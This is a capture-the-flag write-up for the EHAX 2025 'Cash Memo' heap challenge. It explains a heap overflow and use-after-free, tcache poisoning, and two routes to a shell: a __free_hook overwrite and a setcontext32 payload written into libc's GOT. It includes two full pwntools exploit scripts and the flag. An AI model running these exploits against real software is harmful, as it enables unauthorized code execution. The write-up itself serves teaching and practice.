---
ctf: EHAX
title: Cash Memo
authors:
    - name: the_moon_guy
      url: https://github.com/mayank-jangid-moon
description: I have a really hard time managing my cash, am afraid someone might steal my memos...
categories:
    - PWN
difficulty: Medium
ctf_year: 2025
challengefiles: cashmemo
published: "2025-04-17"
---

# TL;DR

- **Challenge Setup:** Simple CRUD heap challenge
- **Vulnerability:** Heap Overflow up to 0x40 Bytes, double free vulnerability and a UAF bug leading to a write-what-where primitive
- **Exploitation Variant 1:** Abuse free_hook pointing to an arbitrary function
- **Exploitation Variant 2:** Abuse setcontext32 to execute arbitrary functions

# Introduction

Sadly there is not much of a story behind this challenge so essentially this is a heap challenge where we can create heap chunks of arbitrary size, free, edit and view these. The chunks are managed in an array.

# Reconnaissance

Checking with `checksec` reveals a lot of security mechanisms activated for the binary - even `FULL RELRO` so we can't just overwrite the `GOT` of the binary. Lucky enough the `GOT` of the libc got only `partial RELRO` so we can just overwrite parts of it. Having a look in binja at the `edit` functionality we can easily discover a heap overflow of up to 0x40 bytes:

![binja-edit](ctf/writeups/ehax/cashmemo/binja_edit.png "binja-edit")

Moreover when freeing chunks the appropriate pointer in the chunk array is not being set to `NULL` which allows us to view chunks even after we freed them - this is also known as a Use-After-Free bug. Theoretically this could lead to a double free vulnerability which could also be exploited for tcache poisoning. But in the following I will show you an exploit abusing the UAF for leaking and overwriting and another exploit where we exploit the heap overflow.

# Vulnerability Description

The UAF bug allows us to leak the heap and libc base by allocating enough space and freeing it, so the chunk will be inserted into the tcache bin and the second into the unsorted bin. The tcache bin lets us leak the heap base and the unsorted bin the libc base, as the chunks are managed as a double linked list and the first and last entry of the list have a pointer into the libc.

![gdb-heapleak-tcache](ctf/writeups/ehax/cashmemo/gdb_heapleak_tcache.png "gdb-heapleak-tcache")

In this example there are two tcache chunks. As tcache chunks are managed as a single linked list via the `tcache_perthread_struct`, the first pointer in the tcache chunk is the `next` pointer pointing to the next free tcache chunk (0x55e9d5190b80).

```c
typedef struct tcache_entry

{

  struct tcache_entry *next;

} tcache_entry;
```

The second pointer always points back to the `tcache_perthread_struct` which got its own chunk at the very beginning of the heap. This struct got some counts array to make sure only a limited size of chunks is actually stored in the tcache. The `entries` array manages the different chains of different sizes. Each chain consists of freed tcache chunks of the same size. The single linked list starts in this array.

```c
typedef struct tcache_perthread_struct

{

  char counts[TCACHE_MAX_BINS];

  tcache_entry *entries[TCACHE_MAX_BINS];

} tcache_perthread_struct;
```

![gdb-heapleak-unsortedbin](ctf/writeups/ehax/cashmemo/gdb_heapleak_unsortedbin.png "gdb-heapleak-unsortedbin")

There is one thing we need to consider when dealing with non-tcache bins. Bins like the unsorted bin will be consolidated with the heap top if they are adjacent to each other. For this reason we need to make sure that the chunk in the unsorted bin got another chunk after it.

# Exploitation

With the heap overflow we can overwrite parts of the following chunk and thus exploit some tcache poisoning. For example if we got a tcache chunk as our next chunk, we can simply overwrite the pointer pointing to the next tcache chunk. If we now allocate a new chunk, malloc will take the first fitting free chunk from our single linked list and the `tcache_perthread_struct` will get the next free chunk via the `next` pointer of the newly allocated chunk and save it in the `entries` array as the start of the chain. If this pointer was overwritten by us, we essentially have a write-what-where primitive as the next allocation allows us to write arbitrary data into that chunk e.g. into the libc `GOT`.

![gdb-tcache-poisoning](ctf/writeups/ehax/cashmemo/gdb_tcache_poisoning.png "gdb-tcache-poisoning")

Instead of the heap overflow we can also exploit the UAF bug by editing a chunk which was freed beforehand, thus overwriting the `next` pointer. Now there are multiple possible solutions how to abuse this constructed primitive.

## Exploitation Variant 1

To turn an arbitrary write into RCE we can abuse the `free_hook` as the challenge just uses glibc version 2.31. Usually the `free_hook` is used to overwrite the behaviour of the `free` functionality e.g. for debugging purposes. But we can also use this hook to call `system` by overwriting it or executing a onegadget. So when e.g. `free("/bin/sh")` is called, actually `system("/bin/sh")` is called. Since glibc 2.34 such hooks were removed.

## Exploitation Variant 2

For this challenge the following technique is a bit of an overkill. I got it from [this blog](https://hackmd.io/@pepsipu/SyqPbk94a) where it is explained in a more detailed way. There are some constraints you need to consider before you can apply this technique. First of all the `GOT` of the libc must be writeable. Second you need either one huge arbitrary write primitive or a primitive you can apply multiple times, as the payload is pretty big.
To apply this technique to the current challenge we need to make sure we can write enough for the `setcontext` payload. Moreover we can't exploit any bins other than the tcache bin, so with a size of 1010 we are still in tcache range and can write up to 1010 + 0x40 bytes which is just enough for the payload to write it as a whole.

# Mitigation

First of all there is absolutely no need for the heap overflow. Just make sure the buffer size and the input size are an exact match. Moreover you should always explicitly set pointers to null when they are not used anymore.

# Solve Script

## Solve Script - Exploit 1

Leak via UAF + tcache poisoning via UAF + free_hook

```python
#!/usr/bin/env python3
from string import Template
import glob
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.log_level = 'debug'

# must be dict
ENV_VARS = None

gdbscript = """
# breakrva 0x1ab5
# set max-visualize-chunk-size 0x250
continue
"""

def main():
    io = start_conn()

    def new(idx, size, first_payload):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"> ", idx)
        io.sendlineafter(b"> ", size)
        io.sendlineafter(b"> ", first_payload)

    def delete(idx):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", idx)

    def edit(idx, content):
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"> ", idx)
        io.sendlineafter(b"> ", content)

    def view(idx):
        io.sendlineafter(b"> ", b"4")
        io.sendlineafter(b"> ", idx)
        return io.recvuntil("You").split(b'\n')[0]

    def exit():
        io.sendlineafter("> ", "5")


    new(b'0', b'400', b"A")
    new(b'1', b'1200', b"B")
    new(b'2', b'400', b"C")
    delete(b'1')

    libc_leak = view(b"1")
    libc_leak_int = int.from_bytes(libc_leak, 'little')
    libc_leak_offset = 0x1ECBE0
    libc_base = libc_leak_int - libc_leak_offset
    print(f'libc_base: {hex(libc_base)}')
    validate_leaked_addresses(io, libc_base=libc_base)
    libc.address = libc_base

    new(b'3', b'200', b'D')
    new(b'4', b'200', b'E')
    delete(b'3')
    delete(b'4')

    edit(b'4', p64(libc.sym["__free_hook"]))
    new(b'5', b'200', b'/bin/sh')
    new(b'6', b'200', b'AAAA')
    edit(b'6', p64(libc.sym["system"]))
    delete(b'5')

    io.interactive()
    clean_up()







### Helper start

def start_conn():
    if args.REMOTE:
        log.info(Template('Starting with remote connection to $HOST on port $PORT...').substitute(HOST=sys.argv[1], PORT=sys.argv[2]))
        io = remote(sys.argv[1], sys.argv[2])
    else:
        log.info('Starting locally...')
        io = process([exe.path], env=ENV_VARS)
        if args.GDB:
            log.info('Starting with GDB...')
            gdb.attach(io, gdbscript=gdbscript, exe=exe.path)
    return io


def get_string_between(res, first_const_str, second_const_str):
    return res.split(first_const_str)[1].split(second_const_str)[0]


def get_mapping_offset(proc_mapping, search_for):
    heap_offset = 0
    for i, mapping in enumerate(proc_mapping):
        if search_for in mapping:
            heap_offset = i
            break
    return heap_offset


def validate_leaked_addr(proc_mapping, offset, given_addr, addr_name):
    true_base = int(proc_mapping[offset].split('-')[0], 16)
    if int(given_addr) != true_base:
        log.critical(
            Template('Leaked $ADDR_NAME $GIVEN_ADDR is not the correct $ADDR_NAME like $TRUE_BASE').substitute(
                ADDR_NAME=addr_name, GIVEN_ADDR=hex(given_addr), TRUE_BASE=hex(true_base)
            ))
    else:
        log.info(
            Template('Leaked $ADDR_NAME $GIVEN_ADDR equals correct $ADDR_NAME $TRUE_BASE').substitute(
                ADDR_NAME=addr_name, GIVEN_ADDR=hex(given_addr), TRUE_BASE=hex(true_base)
            ))


def validate_leaked_addresses(io, bin_base=None, heap_base=None, libc_base=None, stack_base=None):
    if args.REMOTE:
        log.warning('Skipping leaked address validation because not running locally...')
        return

    with open(Template('/proc/$PROC_ID/maps').substitute(PROC_ID=io.proc.pid)) as f:
        proc_mapping = f.readlines()
    if bin_base:
        bin_path_split = exe.path.split('/')
        bin_path = bin_path_split[len(bin_path_split) - 1]
        validate_leaked_addr(proc_mapping, get_mapping_offset(proc_mapping, bin_path), bin_base, 'bin base')
    if heap_base:
        validate_leaked_addr(proc_mapping, get_mapping_offset(proc_mapping, 'heap'), heap_base, 'heap base')
    if libc_base:
        validate_leaked_addr(proc_mapping, get_mapping_offset(proc_mapping, 'libc'), libc_base, 'libc base')
    if stack_base:
        validate_leaked_addr(proc_mapping, get_mapping_offset(proc_mapping, 'stack'), stack_base, 'stack base')

    if not any([bin_base, heap_base, libc_base, stack_base]):
        log.warning('Skipping leaked address validation because no leaked addresses were given...')


def clean_up():
    # remove corefiles (memory dumps) being generated due to program crashes
    for corefile in glob.glob('core*'):
        os.remove(corefile)

### Helper end


if __name__ == "__main__":
    main()

```

## Solve Script - Exploit 2

Leak via UAF + tcache poisoning via heap overflow + setcontext

```python
#!/usr/bin/env python3
from string import Template
import glob
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.log_level = 'debug'

# must be dict
ENV_VARS = None

gdbscript = """
# breakrva 0x1ab5
# set max-visualize-chunk-size 0x250
continue
"""

def create_ucontext(
    src: int,
    rsp=0,
    rbx=0,
    rbp=0,
    r12=0,
    r13=0,
    r14=0,
    r15=0,
    rsi=0,
    rdi=0,
    rcx=0,
    r8=0,
    r9=0,
    rdx=0,
    rip=0xDEADBEEF,
) -> bytearray:
    b = bytearray(0x200)
    b[0xE0:0xE8] = p64(src)
    b[0x1C0:0x1C8] = p64(0x1F80)

    b[0xA0:0xA8] = p64(rsp)
    b[0x80:0x88] = p64(rbx)
    b[0x78:0x80] = p64(rbp)
    b[0x48:0x50] = p64(r12)
    b[0x50:0x58] = p64(r13)
    b[0x58:0x60] = p64(r14)
    b[0x60:0x68] = p64(r15)

    b[0xA8:0xB0] = p64(rip)
    b[0x70:0x78] = p64(rsi)
    b[0x68:0x70] = p64(rdi)
    b[0x98:0xA0] = p64(rcx)
    b[0x28:0x30] = p64(r8)
    b[0x30:0x38] = p64(r9)
    b[0x88:0x90] = p64(rdx)

    return b


def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt_trampoline = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    return got, flat(
        p64(0),
        p64(got + 0x218),
        p64(libc.symbols["setcontext"] + 32),
        p64(plt_trampoline) * 0x40,
        create_ucontext(got + 0x218, rsp=libc.symbols["environ"] + 8, **kwargs),
    )


def main():
    io = start_conn()

    def new(idx, size, first_payload):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"> ", idx)
        io.sendlineafter(b"> ", size)
        io.sendlineafter(b"> ", first_payload)

    def delete(idx):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", idx)

    def edit(idx, content):
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"> ", idx)
        io.sendlineafter(b"> ", content)

    def view(idx):
        io.sendlineafter(b"> ", b"4")
        io.sendlineafter(b"> ", idx)
        return io.recvuntil("You").split(b'\n')[0]

    def exit():
        io.sendlineafter("> ", "5")


    new(b"1", b"24", b"A" * 0x4)
    new(b"3", b"1010", b"C" * 0x8)
    new(b"2", b"1200", b"B" * 0x4)
    new(b"4", b"1010", b"C" * 0x8)

    delete(b'2')
    delete(b'4')
    delete(b'3')

    libc_leak = view(b"2")
    libc_leak_int = int.from_bytes(libc_leak, 'little')
    libc_leak_offset = 0x1ECBE0
    libc_base = libc_leak_int - libc_leak_offset
    print(f'libc_base: {hex(libc_base)}')
    validate_leaked_addresses(io, libc_base=libc_base)
    libc.address = libc_base

    new(b"6", b"1200", "ABCD")

    heap_leak = view(b"3")
    heap_leak_int = int.from_bytes(heap_leak, 'little')
    heap_leak_offset = 0xB80
    heap_base = heap_leak_int - heap_leak_offset
    print(f'heap_leak: {heap_base}')
    validate_leaked_addresses(io, heap_base=heap_base)

    tcache_pointer = heap_base + 0x10
    dest, payload = setcontext32(
        libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()
    )
    edit(b'1', b'ABCD' * 6 + p64(0x21) + p64(dest) + p64(tcache_pointer))

    new(b"7", b"1010", b"G")
    new(b"8", b"1010", payload)

    io.interactive()
    clean_up()







### Helper start

def start_conn():
    if args.REMOTE:
        log.info(Template('Starting with remote connection to $HOST on port $PORT...').substitute(HOST=sys.argv[1], PORT=sys.argv[2]))
        io = remote(sys.argv[1], sys.argv[2])
    else:
        log.info('Starting locally...')
        io = process([exe.path], env=ENV_VARS)
        if args.GDB:
            log.info('Starting with GDB...')
            gdb.attach(io, gdbscript=gdbscript, exe=exe.path)
    return io


def get_string_between(res, first_const_str, second_const_str):
    return res.split(first_const_str)[1].split(second_const_str)[0]


def get_mapping_offset(proc_mapping, search_for):
    heap_offset = 0
    for i, mapping in enumerate(proc_mapping):
        if search_for in mapping:
            heap_offset = i
            break
    return heap_offset


def validate_leaked_addr(proc_mapping, offset, given_addr, addr_name):
    true_base = int(proc_mapping[offset].split('-')[0], 16)
    if int(given_addr) != true_base:
        log.critical(
            Template('Leaked $ADDR_NAME $GIVEN_ADDR is not the correct $ADDR_NAME like $TRUE_BASE').substitute(
                ADDR_NAME=addr_name, GIVEN_ADDR=hex(given_addr), TRUE_BASE=hex(true_base)
            ))
    else:
        log.info(
            Template('Leaked $ADDR_NAME $GIVEN_ADDR equals correct $ADDR_NAME $TRUE_BASE').substitute(
                ADDR_NAME=addr_name, GIVEN_ADDR=hex(given_addr), TRUE_BASE=hex(true_base)
            ))


def validate_leaked_addresses(io, bin_base=None, heap_base=None, libc_base=None, stack_base=None):
    if args.REMOTE:
        log.warning('Skipping leaked address validation because not running locally...')
        return

    with open(Template('/proc/$PROC_ID/maps').substitute(PROC_ID=io.proc.pid)) as f:
        proc_mapping = f.readlines()
    if bin_base:
        bin_path_split = exe.path.split('/')
        bin_path = bin_path_split[len(bin_path_split) - 1]
        validate_leaked_addr(proc_mapping, get_mapping_offset(proc_mapping, bin_path), bin_base, 'bin base')
    if heap_base:
        validate_leaked_addr(proc_mapping, get_mapping_offset(proc_mapping, 'heap'), heap_base, 'heap base')
    if libc_base:
        validate_leaked_addr(proc_mapping, get_mapping_offset(proc_mapping, 'libc'), libc_base, 'libc base')
    if stack_base:
        validate_leaked_addr(proc_mapping, get_mapping_offset(proc_mapping, 'stack'), stack_base, 'stack base')

    if not any([bin_base, heap_base, libc_base, stack_base]):
        log.warning('Skipping leaked address validation because no leaked addresses were given...')


def clean_up():
    # remove corefiles (memory dumps) being generated due to program crashes
    for corefile in glob.glob('core*'):
        os.remove(corefile)

### Helper end


if __name__ == "__main__":
    main()

```

# Flag

EH4X{fr33_h00k_c4n_b3_p01ns0n3d_1t_s33m5}

# References

- [setcontext32](https://hackmd.io/@pepsipu/SyqPbk94a)
